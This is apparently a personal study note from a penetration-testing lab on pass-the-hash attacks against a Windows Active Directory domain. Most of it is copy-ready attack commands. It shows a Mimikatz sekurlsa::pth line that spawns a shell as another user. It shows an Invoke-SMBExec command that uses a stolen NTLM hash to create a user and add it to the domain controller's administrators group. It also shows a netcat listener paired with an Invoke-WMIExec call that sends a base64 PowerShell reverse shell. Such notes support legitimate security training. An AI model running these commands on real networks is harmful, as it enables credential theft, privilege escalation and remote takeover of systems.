## MimiKatz pass the hash
 passing the hash  to create shell in the context of another domain user and access a private share:
this situation where even as whoami -> david had no acesss to //dc01/david
`/ntlm: or /rc4:`
```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:david /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```
![[Pasted image 20250625150700.png]]

## importing hash to Session

#### Invoke-TheHash tool:

create and add a user to admins group on DC
```

Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

#### reverse shell
```powershell
PS C:\tools> .\nc.exe -lvnp 8001

listening on [any] 8001 ...
```

get a reverse shell with https://revshells.com
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <b64shell>
```
![[Pasted image 20250625131506.png]]
